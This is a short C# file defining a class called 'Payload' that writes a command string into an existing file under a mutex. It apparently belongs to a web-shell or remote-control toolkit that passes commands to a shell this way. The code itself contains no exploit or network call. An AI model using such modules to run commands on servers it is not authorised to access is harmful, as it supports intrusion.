using System;
using System.Web;
using System.IO;
using System.Text;
using System.Runtime.Serialization;
using System.Threading;
using System.Diagnostics;

public class Payload
{
    public string Run()
    {
        Directory.SetCurrentDirectory(Global.pwd);
        if(File.Exists(Global.infile)){
            Mutex mut = new Mutex(false, "test123");
            mut.WaitOne();
            File.WriteAllText(Global.infile, Global.cmd);
            mut.ReleaseMutex();
            return "1";
        }
        return "-1";
    }
}